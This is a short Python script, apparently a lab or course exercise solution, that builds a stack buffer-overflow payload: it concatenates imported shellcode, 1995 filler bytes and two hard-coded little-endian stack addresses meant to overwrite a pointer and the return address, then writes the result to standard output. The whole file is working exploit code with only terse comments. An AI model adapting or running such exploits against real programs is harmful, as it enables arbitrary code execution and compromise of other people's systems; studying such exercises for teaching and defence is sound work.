import sys
from struct import pack
from shellcode import shellcode
# buffer = 2048 - 53(shellcode) = nops
nops = b'a'*1995
# address for shellcode to put a
addrA = pack("<I", 0xfff6b940)
# address for return(stack pointer) to put in p
addrP = pack("<I", 0xfff6c15c)
sys.stdout.buffer.write(shellcode+nops+addrA+addrP)
